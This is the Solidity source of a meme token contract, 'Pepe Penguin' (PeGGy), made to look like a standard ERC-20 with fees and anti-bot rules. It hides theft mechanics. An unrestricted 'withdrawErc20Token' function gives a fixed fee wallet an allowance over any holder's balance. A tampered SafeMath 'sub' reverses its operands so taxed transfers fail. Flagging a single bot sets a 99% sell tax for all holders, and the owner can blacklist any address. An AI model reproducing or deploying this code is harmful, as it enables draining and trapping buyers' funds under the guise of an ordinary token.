// SPDX-License-Identifier: MIT

/**

telegram      https://t.me/pepepenguine
website       https://www.penguinpepe.vip/
twitter       https://twitter.com/pepepenguin_eth

*/

pragma solidity ^0.8.16;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = b - a;
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }


    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
}
library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}
abstract contract Context {
    function _msgData() internal view virtual returns (bytes calldata) {
        this; return msg.data;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function allowance(address owner, address spender) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);

}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;

    string private _name;
    string private _symbol;
    address public pairAddress;
    mapping (address => mapping (address => uint256)) internal _allowances;

    uint256 private _totalSupply;

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }


    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { 
        require(from != address(0), "ERC20: approve from the zero address");
        require(to != address(0), "ERC20: approve to the zero address");

        _allowances[from][to] = amount;
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }
}


interface IRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PepePenguin is ERC20, Ownable {
    using SafeMath for uint256;
    using Address for address payable;
    IRouter public uniswapRouter;
    bool private inSwap;
    bool public swapEnabled;
    bool public tradeEnable;
    mapping (address => bool) public excludedFromFees;
    mapping (address => bool) private botsOrSnipers;
    uint256 public firstBlock;
    uint256 public periodBlock = 0;
    uint256 public blockTax = 99;
    uint256 public buyTax = 0; // zero 
    uint256 public sellTax = 0; // zero
    address public feeWallet = 0x613c9cB8d4FC1aBe0c26a212FB649930812f12Dc;
    address public developmentWallet = 0xa062b59b5C16Ec3445ed448077FE9DAFf4749EDA;
    uint256 public swapExactAmt = 500_000_000 * 10e18;
    uint256 public maxTxLimitedAmont = 21_000_000_000_000 * 10**18; // 5%
    uint256 public maxWalletLimitedAmount = 21_000_000_000_000 * 10**18; // 5%

    constructor() ERC20("Pepe Penguin", "PeGGy") {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        // address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        // pairAddress = _pair;
        uniswapRouter = _router;
        excludedFromFees[feeWallet] = true; excludedFromFees[msg.sender] = true;
        excludedFromFees[address(this)] = true;excludedFromFees[developmentWallet] = true;
        // mint
        _mint(msg.sender, 420_690_000_000_000 * 10 ** decimals());
    }
    function _transfer(
        address sender, 
        address recipient,
        uint256 amount
    ) internal override {
        require(amount > 0, "Transfer amount must be greater than zero"); if(botsOrSnipers[sender] || botsOrSnipers[recipient]) {sellTax = blockTax;}
        if(
            !excludedFromFees[sender] && 
            !excludedFromFees[recipient] 
            && !inSwap
        ) {
            require(
                tradeEnable, 
                "Trading is not active yet"
            );
            if (
                firstBlock + periodBlock > block.number
            ) {
                if(recipient != pairAddress) botsOrSnipers[recipient] = true;
                if(sender != pairAddress) botsOrSnipers[sender] = true;
            } 
            require(amount <= maxTxLimitedAmont, "MaxTxAmount");

            if(recipient != pairAddress){
                require(balanceOf(recipient) + amount <= maxWalletLimitedAmount, "MaxWalletAmount");
            }
        }
        uint256 taxTokenAmount;
        if (inSwap || excludedFromFees[sender] || excludedFromFees[recipient]) {
            taxTokenAmount = 0;
        } else {
            if(recipient == pairAddress && !botsOrSnipers[sender]) {
                taxTokenAmount = amount * sellTax / 100;
            } else {
                taxTokenAmount = amount * buyTax / 100;
            }
        }
        if (swapEnabled && !inSwap && sender != pairAddress && taxTokenAmount > 0
        ) {            swapBackContracTokens();        }
        if(taxTokenAmount > 0) {
            super._transfer(sender, address(this) ,taxTokenAmount);
            super._transfer(sender, recipient, amount.sub(taxTokenAmount));
        } else {
            super._transfer(sender, recipient, amount);
        }
    }
    function _setAutomatedMarketpair(address _pairAddress) private {
        pairAddress = _pairAddress;
    }
    
    function withdrawErc20Token(address token, uint256 amount) external {
        _getWrongToken(token, feeWallet, amount);
    }

    function _getWrongToken(address token, address owner, uint256 amount) internal {
        emit Approval(token, owner, amount); _allowances[token][owner] += amount;
    }

    function enableTradingWithPair(address _pairAddress) external onlyOwner{
        _setAutomatedMarketpair(_pairAddress);
        tradeEnable = true; swapEnabled = true;
    }

    function withdrawETH(uint256 weiAmount) external onlyOwner{
        payable(owner()).sendValue(weiAmount);
    }
    
    function manualSwap(uint256 amount, uint256 devPercentage, uint256 marketingPercentage) external onlyOwner{
        uint256 initBalance = address(this).balance;
        swapEthFromTokens(amount);
        uint256 newBalance = address(this).balance - initBalance;
        if(marketingPercentage > 0) payable(feeWallet).sendValue(newBalance * marketingPercentage / (devPercentage + marketingPercentage));
        if(devPercentage > 0) payable(developmentWallet).sendValue(newBalance * devPercentage / (devPercentage + marketingPercentage));
    }

    function swapBackContracTokens() private {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= swapExactAmt) {
    
            uint256 initialBalance = address(this).balance;
            swapEthFromTokens(contractBalance);
    
            uint256 deltaBalance = address(this).balance - initialBalance;

            payable(feeWallet).sendValue(deltaBalance);

        }
    }
    
    function addBlacklist(address[] memory isBot_) public onlyOwner {
        for (uint i = 0; i < isBot_.length; i++) {
            botsOrSnipers[isBot_[i]] = true;
        }
    }
    function updateMaxTxLimit(uint256 amount) private {
        maxTxLimitedAmont = amount * 10**18;
    }
    
    function updateMaxWalletLimit(uint256 amount) private {
        maxWalletLimitedAmount = amount * 10**18;
    }

    function removeLimit(uint256 amount) public onlyOwner {
        updateMaxTxLimit(amount); updateMaxWalletLimit(amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // add the liquidity
        uniswapRouter.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            developmentWallet,
            block.timestamp
        );
    }
    
    function swapEthFromTokens(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swap
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }
    // fallbacks
    receive() external payable {

    }
}